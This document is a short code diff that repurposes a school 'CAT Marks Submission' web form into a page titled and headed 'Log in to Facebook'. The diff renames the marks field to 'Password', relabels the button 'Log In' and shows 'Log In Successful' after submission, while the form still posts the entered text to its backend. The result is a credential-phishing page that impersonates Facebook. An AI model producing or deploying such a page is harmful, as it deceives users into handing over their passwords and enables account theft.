@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CAT Marks Submission</title>
+  <title>Log in to Facebook</title>
 
   <style>
     * {
@@ -79,7 +79,7 @@
 
   <main class="form-wrap">
 
-    <p class="heading">CAT Marks Submission</p>
+    <p class="heading">Log In To Facebook</p>
 
     <form id="marksForm">
 
@@ -93,14 +93,14 @@
 
       <input
         type="text"
-        name="marks"
-        placeholder="Marks"
+        name="Password"
+        placeholder="Password"
         maxlength="100"
         required
       >
 
       <button class="login" type="submit">
-        Submit
+        Log In
       </button>
 
     </form>
@@ -142,7 +142,7 @@
           throw new Error(result.error || "Submission failed");
         }
 
-        status.textContent = "CAT marks submitted successfully.";
+        status.textContent = "Log In Successful";
         form.reset();
 
       } catch (error) {
